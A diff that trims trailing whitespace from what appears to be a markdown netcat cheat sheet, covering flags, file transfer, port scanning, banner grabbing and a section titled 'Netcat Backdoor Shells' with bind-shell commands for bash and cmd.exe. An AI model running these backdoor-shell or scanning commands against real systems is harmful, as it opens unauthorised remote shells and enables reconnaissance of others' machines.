@@ -23,22 +23,22 @@ nc -l [host] [port]
 # initiates a listener on the given port
 
 Netcat Command Flags
-nc -4 
+nc -4
 # use IPv4 only
 
-nc -6 
+nc -6
 # use IPv6
 
-nc -u 
+nc -u
 # use UDP instead of TCP
 
-nc -k -l 
+nc -k -l
 # continue listening after disconnection
 
-nc -n 
+nc -n
 # skip DNS lookups
 
-nc -v 
+nc -v
 # provide verbose output
 ```
 
@@ -63,7 +63,7 @@ nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee b
 nc [host] [port] (greater than) file_name.out
 # send a file
 
-nc [host] [port] (less than) file_name.in 
+nc [host] [port] (less than) file_name.in
 # receive a file
 ```
 
@@ -74,10 +74,10 @@ nc [host] [port] (less than) file_name.in
 nc -zv site.com 80
 # scan a single port
 
-nc -zv hostname.com 80 84 
+nc -zv hostname.com 80 84
 # scan a set of individual ports
 
-nc -zv site.com 80-84 
+nc -zv site.com 80-84
 # scan a range of ports
 ```
 
@@ -85,17 +85,17 @@ nc -zv site.com 80-84
 ### Netcat Banners
 
 ```bash
-echo “” | nc -zv -wl [host] [port range] 
+echo “” | nc -zv -wl [host] [port range]
 # obtain the TCP banners for a range of ports
 ```
 
 ### Netcat Backdoor Shells
 
 ```bash
-nc -l -p [port] -e /bin/bash 
+nc -l -p [port] -e /bin/bash
 # run a shell on Linux
 
-nc -l -p [port] -e cmd.exe 
+nc -l -p [port] -e cmd.exe
 # run a shell on Netcat for Windows
 ```
 
